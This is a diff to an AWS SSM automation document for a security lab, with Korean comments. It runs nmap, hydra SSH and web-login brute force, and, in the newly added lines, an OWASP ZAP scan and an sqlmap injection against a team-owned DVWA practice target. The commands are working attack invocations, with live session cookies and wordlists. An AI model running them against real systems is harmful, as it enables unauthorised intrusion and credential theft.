@@ -1,8 +1,9 @@
 schemaVersion: '2.2'
 description: |
   지리별 공격자 노드에서 서울 DVWA 대상으로 자동 공격을 실행한다.
-  ① nmap 포트/서비스 스캔  ② hydra SSH 무차별 대입  ③ hydra DVWA 웹 로그인 무차별 대입.
-  결과는 S3(스캔 결과 버킷)에 업로드한다. 대시보드 "웹보안검사" 탭의 [시작]이 호출한다.
+  ① nmap 포트/서비스 스캔  ② hydra SSH 무차별 대입  ③ hydra DVWA 웹 로그인 무차별 대입
+  ④ OWASP ZAP 베이스라인 스캔  ⑤ sqlmap SQL 주입 점검.
+  결과는 S3(스캔 결과 버킷)에 업로드한다. 대시보드 "전부 실행"이 호출한다.
   격리된 팀 소유 실습 대상(DVWA)에만 사용한다.
 parameters:
   TargetHost:
@@ -57,6 +58,12 @@ mainSteps:
         - '  echo "session: $SID (token $TOKEN)" | tee -a "$OUT"'
         - '  HP=$(echo "{{ WebBaseUrl }}" | sed -E "s#https?://##; s#/.*##"); WHOST=${HP%%:*}; WPORT=${HP##*:}; [ "$WPORT" = "$WHOST" ] && WPORT=80'
         - '  docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 8 -s "$WPORT" "$WHOST" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID=$SID; security=low" 2>&1 | tee -a "$OUT" || true'
+        - '  # ④ OWASP ZAP 베이스라인 스캔 — ALB(WAF 경유) 대상 능동 점검. 공식 ZAP 이미지를 런타임에 pull.'
+        - '  echo "== [4] zap baseline ==" | tee -a "$OUT"'
+        - '  docker run --rm zaproxy/zap-stable zap-baseline.py -t "{{ WebBaseUrl }}" -I 2>&1 | tee -a "$OUT" || true'
+        - '  # ⑤ sqlmap — DVWA SQLi 페이지 자동 주입 점검(획득한 세션·security=low 사용).'
+        - '  echo "== [5] sqlmap ==" | tee -a "$OUT"'
+        - '  docker run --rm attacker:latest sqlmap -u "{{ WebBaseUrl }}/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SID; security=low" --batch --level=2 --risk=2 2>&1 | tee -a "$OUT" || true'
         - '  rm -f "$JAR"'
         - 'else'
         - '  echo "== [3] dvwa web skipped (WebBaseUrl 미지정) ==" | tee -a "$OUT"'
